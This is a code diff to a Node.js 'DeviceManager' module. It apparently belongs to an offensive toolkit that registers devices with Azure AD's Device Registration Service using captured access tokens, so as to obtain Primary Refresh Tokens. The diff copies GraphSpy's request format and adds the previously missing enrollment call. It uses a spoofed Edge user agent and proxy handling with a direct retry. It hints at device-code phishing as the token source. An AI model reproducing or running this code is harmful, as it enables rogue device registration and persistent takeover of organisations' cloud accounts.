@@ -12,6 +12,19 @@ const config = require('../config/env');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const prtkdf = require('./prtkdf');
 
+// ── GraphSpy exact DRS constants (core/device.py) ───────────────────────────
+// device.register() posts to this exact URL — the ?api-version=2.0 is required
+// or DRS answers 400.
+const DRS_ENDPOINT =
+  'https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0';
+// device.register() sends headers={"User-Agent": ua.get(), "Authorization": ...}
+// and ua.get() resolves to DEFAULT_USER_AGENT (core/user_agent.py).
+const DRS_USER_AGENT =
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0';
+// device.register() defaults
+const DRS_DEVICE_TYPE = 'Windows';
+const DRS_OS_VERSION = '10.0.26100';
+
 /**
  * Encode RSA public key to BCRYPT_RSAKEY_BLOB format (required by DRS)
  */
@@ -113,25 +126,83 @@ function extractTenantFromAccessToken(accessToken) {
 /**
  * Register device with Azure AD DRS
  */
-async function registerDevice(accessToken, tenantId, csrPem, targetDomain, transportKey) {
-  const deviceName = generateDeviceName();
+async function registerDevice(accessToken, tenantId, csrPem, targetDomain, transportKey, options) {
+  const opts = options || {};
+  const deviceName = opts.deviceName || generateDeviceName();
+  const joinType = opts.joinType === undefined ? 0 : opts.joinType;
+  const deviceType = opts.deviceType || DRS_DEVICE_TYPE;
+  const osVersion = opts.osVersion || DRS_OS_VERSION;
 
   if (!csrPem || typeof csrPem !== 'string' || !csrPem.includes('BEGIN CERTIFICATE REQUEST')) {
     throw new Error('Invalid CSR: csrPem is missing or not a valid PEM string');
   }
 
-  // Convert CSR from PEM to DER and Base64
-  let csr;
+  // GraphSpy device.register(): certbytes = base64(csr.public_bytes(DER)).
+  // DRS wants the CSR as base64 DER inside CertificateRequest.Data, not PEM.
+  let csrDerBase64;
   try {
-    csr = forge.pki.certificationRequestFromPem(csrPem);
-  } catch (err) {
+    const csrAsn1 = forge.pki.certificationRequestToAsn1(
+      forge.pki.certificationRequestFromPem(csrPem)
+    );
+    csrDerBase64 = Buffer.from(forge.asn1.toDer(csrAsn1).getBytes(), 'binary').toString('base64');
+  } catch (csrErr) {
+    throw new Error(`Invalid CSR: could not convert to DER (${csrErr.message})`);
+  }
 
-    const status = err.response?.status;
-    const data = err.response?.data;
-    if (status) {
-      throw new Error(`DRS registration failed: HTTP ${status} - ${JSON.stringify(data)}`);
+  // GraphSpy device.register() request_body — exact key set and ordering:
+  //   CertificateRequest, TransportKey, TargetDomain, DeviceType,
+  //   OSVersion, DeviceDisplayName, JoinType, attributes
+  const requestBody = {
+    CertificateRequest: { Type: 'pkcs10', Data: csrDerBase64 },
+    TransportKey: transportKey,
+    TargetDomain: targetDomain,
+    DeviceType: deviceType,
+    OSVersion: osVersion,
+    DeviceDisplayName: deviceName,
+    JoinType: joinType,
+    attributes: { ReuseDevice: 'true', ReturnClientSid: 'true' },
+  };
+
+  // ── The actual DRS enrollment call ──────────────────────────────────────
+  // This request was missing entirely: the function went straight from CSR
+  // conversion to reading `response.data`, so `response` was undefined and
+  // every registration died with "response is not defined".
+  const drsHeaders = {
+    Authorization: `Bearer ${accessToken}`,
+    'Content-Type': 'application/json',
+    Accept: 'application/json',
+    'User-Agent': DRS_USER_AGENT,
+  };
+  const drsPayload = JSON.stringify(requestBody);
+
+  let response;
+  try {
+    response = await ms.post(DRS_ENDPOINT, drsPayload, {
+      headers: drsHeaders,
+      timeout: 30000,
+      validateStatus: () => true,
+    });
+  } catch (err) {
+    // A transport-level failure (dead proxy, reset connection) is worth one
+    // direct retry — DRS is not IP-bound the way the device_code flow is.
+    const transportFailure = /ECONNRESET|ETIMEDOUT|ECONNREFUSED|EAI_AGAIN|socket hang up|tunneling socket/i
+      .test(err.message || '');
+    if (transportFailure) {
+      console.warn('[DeviceManager] DRS registration transport error (' + err.message + '); retrying direct');
+      response = await ms.post(DRS_ENDPOINT, drsPayload, {
+        headers: drsHeaders,
+        timeout: 30000,
+        noProxy: true,
+        validateStatus: () => true,
+      });
+    } else {
+      const status = err.response?.status;
+      const data = err.response?.data;
+      if (status) {
+        throw new Error(`DRS registration failed: HTTP ${status} - ${JSON.stringify(data)}`);
+      }
+      throw new Error(`DRS registration request failed: ${err.message}`);
     }
-    throw new Error(`DRS registration request failed: ${err.message}`);
   }
 
   const data = response.data;
@@ -139,9 +210,41 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
     throw new Error(`DRS registration returned invalid response: ${typeof data}`);
   }
 
-  // Handle multiple DRS response formats
-  const deviceCertificate = data.Certificate || data.deviceCertificate || data.DeviceCertificate;
-  const deviceId = data.User?.ObjectId || data.User?.deviceId || data.User?.id;
+  if (response.status !== 200) {
+    const errorCode = data.code || data.ErrorType || data.errorType || 'Unknown error';
+    const errorMsg = data.message || data.Message || '';
+    throw new Error(
+      `DRS registration failed: HTTP ${response.status} - ${errorCode}: ${errorMsg}` +
+      `\nFull response: ${JSON.stringify(data).substring(0, 500)}`
+    );
+  }
+
+  // GraphSpy: certificate_base64 = response_json["Certificate"]["RawBody"]
+  let deviceCertificate = data.Certificate || data.deviceCertificate || data.DeviceCertificate;
+  if (deviceCertificate && typeof deviceCertificate === 'object') {
+    deviceCertificate =
+      deviceCertificate.RawBody || deviceCertificate.rawBody || deviceCertificate.value || null;
+  }
+
+  // GraphSpy: device_id = certificate.subject COMMON_NAME — NOT data.User.*.
+  // The CN on the issued certificate is the identity DRS registered, and it is
+  // what must be used as the `iss`/`sub` of the client assertion later.
+  let deviceId = null;
+  try {
+    if (typeof deviceCertificate === 'string' && deviceCertificate.length > 0) {
+      const derBuf = Buffer.from(deviceCertificate.replace(/\s/g, ''), 'base64');
+      const cert = forge.pki.certificateFromAsn1(forge.asn1.fromDer(derBuf.toString('binary')));
+      const cnField = cert.subject.getField('CN');
+      if (cnField && cnField.value) deviceId = cnField.value;
+    }
+  } catch (cnErr) {
+    console.warn('[DeviceManager] Could not read CN from issued certificate:', cnErr.message);
+  }
+  if (!deviceId) {
+    deviceId =
+      data.User?.ObjectId || data.User?.deviceId || data.User?.id ||
+      data.DeviceId || data.deviceId || null;
+  }
   const registrationTenantId = tenantId;
   let certificateThumbprint = null;
   let certificateDerBase64 = null; // Original DER base64 from DRS response â€” must preserve for x5c
@@ -221,12 +324,17 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
       }
     }
     if (!parsed) {
-      // Case 2: base64 DER (naked, no PEM headers)
+      // Case 2: base64 DER (naked, no PEM headers) — this is what GraphSpy's
+      // device.register() returns in Certificate.RawBody.
       try {
         const derBuffer = Buffer.from(trimmed, 'base64');
         const cert = forge.pki.certificateFromAsn1(forge.asn1.fromDer(derBuffer.toString('binary')));
         certificateString = forge.pki.certificateToPem(cert);
         certificateThumbprint = crypto.createHash('sha1').update(derBuffer).digest('hex').toUpperCase();
+        // Keep the ORIGINAL DER base64. Re-deriving it from the PEM round-trip
+        // changes bytes, and AAD computes x5t from the x5c we send — a mismatch
+        // makes the assertion fail with AADSTS700027 (key not found).
+        certificateDerBase64 = trimmed;
         parsed = true;
       } catch (e2) {
         // Not naked base64 DER either; try hex next
@@ -241,6 +349,7 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
           const cert = forge.pki.certificateFromAsn1(forge.asn1.fromDer(derBuffer.toString('binary')));
           certificateString = forge.pki.certificateToPem(cert);
           certificateThumbprint = crypto.createHash('sha1').update(derBuffer).digest('hex').toUpperCase();
+          certificateDerBase64 = derBuffer.toString('base64');
           parsed = true;
         } catch (e2) {
           console.error('[DeviceManager] Certificate parsing failed after hex fallback:', e2.message);
@@ -594,7 +703,10 @@ async function registerDeviceAndGetPrt(tokenData) {
       accessTokenClaims = { decode_error: e.message };
     }
     console.log('[DeviceManager] DRS debug:', { tenantId: tenant_id, targetDomain: target_domain, tokenPrefix, accessTokenClaims });
-    registrationResult = await registerDevice(drsAccessToken, tenant_id, csrPem, target_domain, transportKey);
+    registrationResult = await registerDevice(drsAccessToken, tenant_id, csrPem, target_domain, transportKey, {
+      deviceName,
+      osVersion: DRS_OS_VERSION,
+    });
     console.log('[DeviceManager] Device registered:', registrationResult.deviceId);
 
   } catch (err) {
